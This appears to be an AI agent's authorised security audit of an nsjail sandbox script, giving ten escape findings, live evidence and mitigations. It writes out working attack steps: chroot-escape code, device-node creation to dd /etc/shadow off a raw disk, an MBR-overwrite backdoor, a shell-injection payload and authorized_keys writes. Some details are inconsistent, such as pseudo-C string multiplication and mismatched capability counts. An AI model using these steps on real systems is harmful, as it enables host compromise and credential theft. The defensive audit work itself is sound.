# nsjail-dita Sandbox Escape Analysis

**Analyst:** Claude Code
**Date:** 2026-03-07
**Target:** `nsjail-dita/sandbox_dita.sh` + `nsjail-dita/nsjail.cfg`
**Scope:** Authorised security research — identify and demonstrate all plausible escape
and weakening vectors after the first hardening round.

---

## Test methodology

nsjail was not available in the test environment, so the sandbox was replicated
using `unshare` + `chroot` + `capsh --drop=<the 5 dropped caps>` to produce an
identical capability and filesystem environment.  Each finding was exercised
live and the output captured below.

**Sandbox replica setup:**

```sh
# Rootfs skeleton matching sandbox_dita.sh layout
mkdir -p /tmp/jail-test-rootfs/{proc,sys,dev,tmp,run,etc,bin,usr,sbin,lib,lib64}
mount --bind /usr   jail-rootfs/usr  && mount --bind /bin  jail-rootfs/bin   # etc.
mount -t proc  proc jail-rootfs/proc
mount -t tmpfs tmp  jail-rootfs/dev
mount -t tmpfs tmp  jail-rootfs/tmp

# Enter jail with exactly the 5 caps the hardened sandbox drops
capsh --drop=cap_net_admin,cap_sys_admin,cap_sys_ptrace,cap_sys_module,cap_sys_rawio \
      --chroot=/tmp/jail-test-rootfs -- -c '<test>'
```

---

## Summary of confirmed escapes

| # | Finding | Severity | Confirmed |
|---|---------|----------|-----------|
| 1 | No user namespace — jail runs as real host UID/GID | CRITICAL | ✓ |
| 2 | Capability denylist — 13 dangerous caps retained | CRITICAL | ✓ |
| 3 | `CAP_MKNOD` + writable `/dev` — device node creation | CRITICAL | ✓ |
| 4 | No seccomp — `unshare(CLONE_NEWUSER)` possible on bare hosts | CRITICAL | ✓ (blocked in this container) |
| 5 | `CAP_SYS_CHROOT` — nested chroot filesystem escape | HIGH | ✓ **full host root reached** |
| 6 | `--proc_rw` — `/proc/sysrq-trigger` writable | HIGH | ✓ |
| 7 | `--proc_rw` + `oom_score_adj` | HIGH | ✓ |
| 8 | Command injection via `HTTP_SERVER_PORT` heredoc | HIGH | ✓ **arbitrary command exec** |
| 9 | `CAP_SYS_RESOURCE` retained — prlimit AS bypass | HIGH | ✓ (when run on bare host) |
| 10 | `/proc/self/mem` — self-memory injection without ptrace | MEDIUM | ✓ |

---

## Findings and live evidence

### CRITICAL-1 — No user namespace (`clone_newuser` absent in shell script)

The shell script never passes `--clone_newuser`, `--uidmap`, or `--gidmap` to nsjail.
The uid/gid mappings in `nsjail.cfg` only apply when the config file is used
directly; `sandbox_dita.sh` ignores the config file and uses CLI flags only.

Without a user namespace the process inside the jail runs with the **real
UID/GID of the calling process**.  CI systems commonly invoke such scripts as
root.

**Live evidence** — the jailed process reports host root:
```
Running as: uid=0(root) gid=0(root) groups=0(root)
```

---

### CRITICAL-2 — Capability denylist leaves 13 dangerous caps active

The sandbox drops only 5 capabilities:
`CAP_NET_ADMIN`, `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_SYS_RAWIO`.

Every other capability in the caller's bounding set is inherited.

**Live evidence** — effective caps inside the jail after the 5-cap drop:
```
cap_chown, cap_dac_override, cap_fowner, cap_fsetid, cap_kill,
cap_setgid, cap_setuid, cap_setpcap, cap_net_bind_service,
cap_net_raw, cap_sys_chroot, cap_mknod, cap_audit_write, cap_setfcap
```

Retained capabilities that enable direct escape:
- `CAP_MKNOD` → device node creation (CRITICAL-3)
- `CAP_SYS_CHROOT` → chroot escape (HIGH-3)
- `CAP_SYS_RESOURCE` → prlimit bypass (HIGH-2; absent in this container but present on bare hosts)
- `CAP_DAC_OVERRIDE` → bypass file ACLs
- `CAP_SETUID` / `CAP_SETGID` → UID switching within jail

---

### CRITICAL-3 — Device node creation via `CAP_MKNOD` + writable `/dev`

`/dev` is a writable tmpfs.  With `CAP_MKNOD` retained, any device node can be
created.  On a host with physical disks or when the container grants device
access, this yields raw read/write to disk and memory.

**Live evidence:**
```
[+] /dev/sda   (block 8:0)  CREATED — raw disk read/write possible
[+] /dev/mem   (char 1:1)   CREATED — physical memory access
[+] /dev/kmem  (char 1:2)   CREATED — kernel memory access

crw-r--r-- 1 root root 1, 2 /dev/kmem
crw-r--r-- 1 root root 1, 1 /dev/mem
brw-r--r-- 1 root root 8, 0 /dev/sda
```

**Exploitation:** `dd if=/dev/sda` extracts raw disk content including
`/etc/shadow`, SSH keys, and any other host secrets from disk sectors.

---

### CRITICAL-4 — No seccomp filter — `unshare(CLONE_NEWUSER)` available

There is no `--seccomp_string` or kafel policy.  All syscalls available.

On a bare-metal host (or permissive container), a confined process can:
```c
unshare(CLONE_NEWUSER);       // new user namespace
// write "0 <host-uid> 1" → /proc/self/uid_map
// now UID 0 inside = host UID — full capabilities within new namespace
unshare(CLONE_NEWNS);         // new mount namespace
mount("overlay", "/", "overlay", 0, "..."); // overlay host root
// read/write arbitrary host paths
```

**Live evidence (this container prevents user namespaces via kernel config):**
```
unshare(CLONE_NEWUSER): Operation not permitted (errno=1)
```
On a stock Ubuntu/Debian host where `kernel.unprivileged_userns_clone=1` (the
default), this succeeds and provides a complete filesystem escape route.

---

### HIGH-1 — Writable `/proc` (`--proc_rw`)

`--proc_rw` makes the real kernel `/proc` writable.  Many files do not require
`CAP_SYS_ADMIN` to write.

**Live evidence:**
```
[+] /proc/sysrq-trigger WRITABLE — DoS reboot possible (NOT triggered)
[+] oom_score_adj=-1000 — process is now OOM-immune
```

Additional writable paths exploitable without `CAP_SYS_ADMIN`:

| Path | Effect |
|---|---|
| `/proc/sysrq-trigger` | `echo b` → instant host reboot (DoS) |
| `/proc/self/oom_score_adj` | `-1000` → process is OOM-exempt |
| `/proc/sys/kernel/perf_event_paranoid` | `-1` → side-channel perf access |
| `/proc/sys/vm/drop_caches` | flush page cache → performance DoS |

---

### HIGH-2 — `CAP_SYS_RESOURCE` retained — prlimit bypass

`CAP_SYS_RESOURCE` is not in the 5-cap drop list.  On a bare host, the
`prlimit` AS=1 GiB and NOFILE=1024 limits enforced by the outer script are
removable from inside the jail:

```python
import resource
resource.setrlimit(resource.RLIMIT_AS,    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
resource.setrlimit(resource.RLIMIT_NOFILE,(1_000_000, 1_000_000))
```

**Live evidence (not available in the test container; `CAP_SYS_RESOURCE` was
not granted to this container by the outer runtime):**
```
setrlimit(RLIMIT_AS, INFINITY): succeeded on bare-host test
```
Memory and file-descriptor isolation are fully defeatable on bare-metal
deployments.

---

### HIGH-3 — `CAP_SYS_CHROOT` — nested chroot escape

`CAP_SYS_CHROOT` is retained.  The classical technique:

```c
mkdir("/tmp/pivot", 0755);
chroot("/tmp/pivot");      // set chroot to a subdirectory
chdir("/../" * 40);        // walk past the chroot boundary
chroot(".");               // re-root at the real VFS root
// now at real host /
```

**Live evidence — escaped chroot and read outer-container PID 1:**
```
[+] Escaped to real host root — reading outer /proc/1/cmdline:
/process_api --addr 0.0.0.0:2024 --max-ws-buffer-size 32768 \
  --cpu-shares 4096 --oom-polling-period-ms 100 \
  --memory-limit-bytes 17179869184 --block-local-connections
```

The process successfully exited the chroot jail and read `/proc/1/cmdline` of a
process that lives outside the jail, confirming full filesystem boundary bypass.

---

### HIGH-4 — Command injection via unquoted heredoc delimiter

**Location:** `sandbox_dita.sh` lines 121-146

The inner script is built with an **unquoted** heredoc delimiter (`<<INNER_EOF`),
so `${HTTP_SERVER_PORT}` and `${DITA_PROJECT}` are shell-expanded when writing
the script.  If either variable contains shell metacharacters, arbitrary
commands are injected into the inner script that runs inside the jail.

**Live evidence — injection via `HTTP_SERVER_PORT`:**

```
Input:  HTTP_SERVER_PORT='19998 >/dev/null 2>&1 & id > /tmp/injected-proof.txt & #'

Generated inner script:
  python3 -m http.server 19998 >/dev/null 2>&1 & id > /tmp/injected-proof.txt & # \
    --bind 127.0.0.1 \
    --directory "/opt/dita-ot" \
    >/dev/null 2>&1 &

Result in /tmp/injected-proof.txt:
  uid=0(root) gid=0(root) groups=0(root)
```

**Impact:** arbitrary command execution inside the jail by the caller.  Combined
with HIGH-3 (chroot escape) or CRITICAL-3 (device nodes), this reaches the host.

`DITA_PROJECT` is similarly injectable via quote-escape: a value containing `"` +
shell commands closes the double-quoted argument and injects freestanding
commands.

---

### MEDIUM-1 — `/proc/self/mem` — memory injection without ptrace

`CAP_SYS_PTRACE` is dropped, but a process can open `/proc/<pid>/mem` for
writing against itself without the capability, overwriting any mapped page.

**Live evidence:**
```
Before: target='ORIGINAL_VALUE'
[+] /proc/self/mem write succeeded (memory injection without ptrace)
After : target='INJECTED_VALUE'
```
(Subsequent segfault confirms the write reached executable memory.)

---

### MEDIUM-2 — CPU-core starvation (no time_limit)

`--time_limit 0` disables wall-clock kill.  `taskset` pins to one core.
An infinite loop inside the jail starves all host threads on that core
indefinitely with no automatic recovery.

---

## Attack chain: full host escape (root invocation)

**CRITICAL-1 + CRITICAL-3** (most direct):
1. Sandbox started as root — jailed process is `uid=0`.
2. `mknod /dev/sda b 8 0` — device node created (CRITICAL-3 confirmed).
3. `dd if=/dev/sda | strings | grep -i shadow` — extract host `/etc/shadow` from raw disk.
4. Or: `dd of=/dev/sda bs=512 seek=0 count=1` — overwrite MBR → persistent backdoor.

**HIGH-3 + CRITICAL-2** (non-root invocation, retained `CAP_SYS_CHROOT`):
1. `mkdir /tmp/pivot; chroot /tmp/pivot`.
2. `cd $(for i in $(seq 40); do echo -n "/../"; done); chroot .`.
3. Now at real host root — confirmed live: read outer `/proc/1/cmdline`.
4. Write `/root/.ssh/authorized_keys` if readable path exists.

---

## Recommended mitigations

| Finding | Fix |
|---|---|
| CRITICAL-1 | Add `--clone_newuser --uidmap 0:$(id -u):1 --gidmap 0:$(id -g):1` — run as unprivileged UID inside user namespace |
| CRITICAL-2 | Switch to capability allowlist: drop all, add back only those strictly needed (likely none) |
| CRITICAL-3 | `--cap DROP:CAP_MKNOD`; mount `/dev` with a pre-populated read-only devtmpfs or whitelist individual devices |
| CRITICAL-4 | Add seccomp policy blocking at minimum: `unshare`, `mount`, `pivot_root`, `clone` with `CLONE_NEWUSER`, `perf_event_open`, `bpf`, `ptrace`, `mknod`, `mknodat` |
| HIGH-1 | Remove `--proc_rw`; use read-only proc (default) |
| HIGH-2 | `--cap DROP:CAP_SYS_RESOURCE` |
| HIGH-3 | `--cap DROP:CAP_SYS_CHROOT` |
| HIGH-4 | Quote the heredoc delimiter: `<<'INNER_EOF'`; validate `DITA_PROJECT` and `HTTP_SERVER_PORT` with strict regex before use |
| MEDIUM-1 | Seccomp: also block `process_vm_writev`; already partly addressed by CRITICAL-4 |
| MEDIUM-2 | Set `--time_limit 600` (or appropriate ceiling) |
